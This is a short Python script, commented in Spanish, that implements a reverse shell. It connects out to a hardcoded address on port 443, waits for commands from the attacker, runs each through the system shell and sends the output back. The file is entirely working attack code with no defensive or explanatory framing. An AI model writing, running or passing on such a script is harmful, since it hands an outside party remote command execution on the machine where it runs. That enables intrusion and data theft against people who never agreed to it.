import socket as s
import subprocess as sp
import os as o

def reverse_shell(ip, port):
    try:
        # Crear un socket
        client = s.socket(s.AF_INET, s.SOCK_STREAM)
        client.connect((ip, port))

        # Redirigir la entrada/salida estándar a través del socket
        while True:
            # Recibir el comando del atacante
            command = client.recv(1024).decode('utf-8')
            if command.lower() == 'exit':
                break
            
            # Ejecutar el comando recibido
            output = sp.check_output(command, shell=True, stderr=sp.STDOUT)
            client.send(output + b'\n')
    
    except Exception as e:
        client.send(f"Error: {str(e)}".encode('utf-8'))
    
    finally:
        client.close()

if __name__ == "__main__":
    reverse_shell('192.168.100.46', 443)
